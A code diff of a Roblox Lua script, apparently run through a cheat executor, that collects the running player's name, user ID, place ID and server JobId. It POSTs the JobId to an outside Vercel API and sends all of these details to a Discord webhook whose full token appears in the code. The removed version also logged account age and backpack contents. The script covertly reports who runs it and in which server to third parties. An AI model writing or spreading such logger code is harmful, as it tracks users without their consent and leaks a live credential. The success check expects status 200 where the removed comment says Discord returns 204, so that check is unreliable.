@@ -2,22 +2,17 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
 local player = Players.LocalPlayer
+local jobId = tostring(game.JobId)
+local placeId = game.PlaceId
 local userId = player.UserId
 local playerName = player.Name
-local accountAge = player.AccountAge -- umur akun dalam hari
-local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+local gameUrl = "https://www.roblox.com/games/" .. placeId
+local timeNow = DateTime.now():ToIsoDate()
 
--- Kumpulkan isi backpack (nama tool)
-local backpack = player:WaitForChild("Backpack")
-local backpackItems = {}
-for _, item in ipairs(backpack:GetChildren()) do
-    table.insert(backpackItems, item.Name)
-end
-local backpackStr = #backpackItems > 0 and table.concat(backpackItems, ", ") or "Kosong"
-
+local apiEndpoint = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
 local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 
--- Pilih fungsi request sesuai executor
+-- Pilih fungsi request dari executor yang tersedia
 local requestFunction = nil
 
 if type(http_request) == "function" then
@@ -37,6 +32,7 @@ if typeof(requestFunction) ~= "function" then
     return
 end
 
+-- Fungsi aman untuk melakukan request dengan pcall error handling
 local function safeRequest(options)
     local success, result = pcall(function()
         return requestFunction(options)
@@ -49,45 +45,56 @@ local function safeRequest(options)
     end
 end
 
--- Buat payload embed webhook Discord
+-- Kirim instanceId ke server API
+local jsonData = HttpService:JSONEncode({ instanceId = jobId })
+local apiResponse = safeRequest({
+    Url = apiEndpoint,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = jsonData
+})
+
+if apiResponse and apiResponse.StatusCode == 200 then
+    print("✅ InstanceId berhasil dikirim ke server:", jobId)
+else
+    warn("❌ Gagal mengirim ke server:", apiResponse and apiResponse.StatusCode or "No response")
+end
+
+-- Payload Discord webhook dengan embed detail
 local webhookPayload = {
-    ["username"] = "🎒 Backpack Logger",
-    ["avatar_url"] = "https://i.imgur.com/0y0F0Gj.png", -- Icon tas, bisa ganti
+    ["username"] = "🛰️ Script Logger",
+    ["avatar_url"] = "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/OOjs_UI_icon_script-ltr.svg/2048px-OOjs_UI_icon_script-ltr.svg.png",
     ["embeds"] = {{
-        ["title"] = "📦 Informasi Backpack dan Akun",
-        ["color"] = 0x3498db, -- biru
+        ["title"] = "📡 Script Dijalan",
+        ["color"] = 0x00FF00, -- hijau
         ["fields"] = {
             {
                 ["name"] = "👤 Player",
-                ["value"] = string.format("`%s` (ID: `%d`)", playerName, userId),
+                ["value"] = string.format("`%s` (ID: `%s`)", playerName, userId),
                 ["inline"] = true
             },
             {
-                ["name"] = "⏳ Umur Akun",
-                ["value"] = string.format("%d hari", accountAge),
+                ["name"] = "📍 Game",
+                ["value"] = string.format("[%s](%s)", placeId, gameUrl),
                 ["inline"] = true
             },
             {
-                ["name"] = "🔗 Profile Roblox",
-                ["value"] = string.format("[Klik Disini](%s)", profileUrl),
-                ["inline"] = false
-            },
-            {
-                ["name"] = "🎒 Isi Backpack",
-                ["value"] = backpackStr,
+                ["name"] = "🧩 Job ID",
+                ["value"] = "`" .. jobId .. "`",
                 ["inline"] = false
             }
         },
         ["footer"] = {
-            ["text"] = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
+            ["text"] = "Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
             ["icon_url"] = "https://i.imgur.com/Z4VbQXz.png"
         },
-        ["timestamp"] = DateTime.now():ToIsoDate()
+        ["timestamp"] = timeNow
     }}
 }
 
--- Kirim webhook ke Discord
-local response = safeRequest({
+local webhookResponse = safeRequest({
     Url = webhookUrl,
     Method = "POST",
     Headers = {
@@ -96,8 +103,8 @@ local response = safeRequest({
     Body = HttpService:JSONEncode(webhookPayload)
 })
 
-if response and response.StatusCode == 204 then -- Discord webhook sukses kirim status 204 No Content
+if webhookResponse and webhookResponse.StatusCode == 200 then
     print("✅ Webhook Discord berhasil dikirim!")
 else
-    warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "No response")
+    warn("❌ Gagal mengirim webhook:", webhookResponse and webhookResponse.StatusCode or "No response")
 end
